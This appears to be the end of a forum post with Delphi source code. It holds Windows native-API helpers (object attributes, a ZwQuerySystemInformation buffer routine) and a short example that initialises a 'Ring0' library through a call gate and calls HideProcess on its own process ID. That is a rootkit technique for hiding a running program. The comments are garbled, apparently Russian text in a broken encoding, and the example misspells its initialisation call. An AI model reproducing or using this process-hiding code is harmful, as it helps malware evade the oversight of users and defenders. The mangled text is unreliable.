LPC_PORT_CLOSED = 6; 
LPC_CLIENT_DIED = 7; 
LPC_EXCEPTION   = 8; 
LPC_DEBUG_EVENT = 9; 
LPC_ERROR_EVENT = 10; 
LPC_CONNECTION_REQUEST = 11; 
procedure InitializeObjectAttributes( 
 InitializedAttributes : PObjectAttributes; 
 pObjectName : PUnicodeString; 
 const uAttributes : ULONG; 
 const hRootDirectory : THandle; 
 pSecurityDescriptor : PSECURITY_DESCRIPTOR); 
Function GetInfoTable(ATableType:dword):Pointer; 

implementation 
{ �ڧߧڧ�ڧѧݧڧ٧ѧ�ڧ� �����ܧ���� TObjectAttributes } 
procedure InitializeObjectAttributes( 
 InitializedAttributes : PObjectAttributes; 
 pObjectName : PUnicodeString; 
 const uAttributes : ULONG; 
 const hRootDirectory : THandle; 
 pSecurityDescriptor : PSECURITY_DESCRIPTOR); 
begin 
 with InitializedAttributes^ do 
 begin 
  Length := SizeOf(TObjectAttributes); 
  ObjectName := pObjectName; 
  Attributes := uAttributes; 
  RootDirectory := hRootDirectory; 
  SecurityDescriptor := pSecurityDescriptor; 
  SecurityQualityOfService := nil; 
 end; 
end; 
{ ����ݧ��֧ߧڧ� �ҧ��֧�� �� ��ڧ��֧ާߧ�� �ڧߧ���ާѧ�ڧ֧� } 
Function GetInfoTable(ATableType:dword):Pointer; 
var 
 mSize: dword; 
 mPtr: pointer; 
 St: NTStatus; 
begin 
 Result := nil; 
 mSize := $4000; //�ߧѧ�ѧݧ�ߧ�� ��ѧ٧ާ֧� �ҧ���֧�� 
 repeat 
   mPtr := VirtualAlloc(nil, mSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE); 
   if mPtr = nil then Exit; 
   St := ZwQuerySystemInformation(ATableType, mPtr, mSize, nil); 
   if St = STATUS_INFO_LENGTH_MISMATCH then 
      begin //�ߧѧէ� �ҧ�ݧ��� ��ѧާ��� 
        VirtualFree(mPtr, 0, MEM_RELEASE); 
        mSize := mSize * 2; 
      end; 
 until St <> STATUS_INFO_LENGTH_MISMATCH; 
 if St = STATUS_SUCCESS 
   then Result := mPtr 
   else VirtualFree(mPtr, 0, MEM_RELEASE); 
end; 

end. 

[/code] 
����ڧާ֧� �ڧ���ݧ�٧�ӧѧߧڧ� 
[code] 
 program test; 
uses 
  Ring0; 
var MyPid: dword; 
  MyEPROCESS: dword; 
begin 
 InitialzeRing0Library(CALL_GATE); 
  MyPid := GetCurrentProcessId(); 
  MyEPROCESS := HideProcess(MyPid); 
  if MyEPROCESS <= 0 then Exit; 
  FreeRing0Library(); end. 
